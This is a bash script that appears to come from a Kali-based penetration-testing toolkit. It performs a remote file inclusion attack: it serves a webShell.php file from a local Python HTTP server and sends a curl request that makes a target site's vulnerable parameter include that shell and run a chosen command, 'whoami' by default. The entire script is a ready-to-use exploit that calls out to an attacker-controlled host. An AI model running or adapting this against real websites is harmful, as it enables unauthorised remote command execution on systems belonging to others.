#!/bin/bash

: '
Remote RFI with HTTP
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
WEBSITE_FIELD=$(form_item "website" "website" "http://domain.com/?lang=")
CMD_FIELD=$(form_item "cmd" "cmd" "whoami")
PORT_FIELD=$(form_item "http port" "port" "9001")

# Generate GUI form
generate_form "${WEBSITE_FIELD}" "${CMD_FIELD}" "${PORT_FIELD}"

WEBSITE=${form_data["website"]}
CMD=${form_data["cmd"]}
PORT=${form_data["port"]}

cd "${SCRIPTS_DIR}/web/lfi/.files"
python3 -m http.server ${PORT} &
HTTP_PID=$!

execute_command "curl -ks '${WEBSITE}http://${KALI_IP}:${PORT}/webShell.php&cmd=${CMD}'"
create_new_line
sleep 60

kill $HTTP_PID
